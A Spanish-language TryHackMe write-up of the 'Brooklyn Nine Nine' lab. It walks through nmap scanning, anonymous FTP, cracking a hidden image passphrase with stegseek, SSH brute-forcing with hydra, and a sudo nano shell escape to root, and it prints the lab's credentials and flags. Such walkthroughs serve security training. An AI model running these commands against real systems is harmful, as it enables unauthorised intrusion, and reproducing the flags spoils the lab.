---
title: "TryHackMe: Brooklyn Nine Nine"
category: "TryHackMe"
order: 26
tags: ["tryhackme", "ftp", "steganography", "stegseek", "sudo", "gtfobins"]
layout: layouts/writeup.njk
permalink: /writeups/thm-brooklyn-nine-nine.html
---

## Reconocimiento

```bash
nmap -Pn -n -v 10.10.157.36 -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

## Puerto 21 — FTP anónimo

```bash
ftp -p 10.10.157.36 21
Name: anonymous
Password:
230 Login successful.

ftp> ls
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
ftp> get note_to_jake.txt
```

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

La nota apunta a un usuario **Jake** con contraseña débil (candidato a fuerza bruta) y menciona a **Holt**.

## Puerto 80 — esteganografía

El sitio web es solo una imagen de fondo. El código fuente contiene un comentario preguntando si el visitante sabe de esteganografía. Se descarga la imagen y se prueba con `stegseek`:

```bash
stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

cat brooklyn99.jpg.out
Holts Password:
fluffydog12@ninenine
```

Confirma que **Holt** es un usuario real (no solo la palabra en inglés) con contraseña `fluffydog12@ninenine`.

## Acceso y user.txt

```bash
ssh holt@10.10.208.97
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

**Flag user:** `ee11cbb19052e40b07aac0ca060c23ee`

## Escalada de privilegios (sudo nano)

```bash
holt@brookly_nine_nine:~$ sudo -l
User holt may run the following commands:
    (ALL) NOPASSWD: /bin/nano
```

Según GTFOBins, `nano` con sudo permite escapar a una shell root:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

```bash
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845
```

**Flag root:** `63a9f0ea7bb98050796b649e85481845`

## Camino alternativo (fuerza bruta directa a Jake)

La pista del FTP en realidad apuntaba a un camino distinto: fuerza bruta directa contra el usuario Jake.

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.208.97 ssh -t 4
...
[22][ssh] host: 10.10.208.97   login: jake   password: 987654321
```

Ambos caminos (Holt vía esteganografía, o Jake vía fuerza bruta) llegan al objetivo — la nota FTP era la pista para el segundo, no para el primero.

## Lecciones aprendidas

- `stegseek` con `rockyou.txt` es mucho más rápido que herramientas de esteganografía tradicionales (`steghide` por fuerza bruta manual) para atacar contraseñas débiles ocultas en imágenes.
- GTFOBins es indispensable cuando `sudo -l` revela un binario permitido inesperado — casi cualquier editor de texto, paginador o intérprete con capacidad de ejecutar comandos es una vía directa a shell.
- Una misma máquina puede tener múltiples caminos de intrusión válidos; no asumir que la pista más obvia es la única solución esperada.
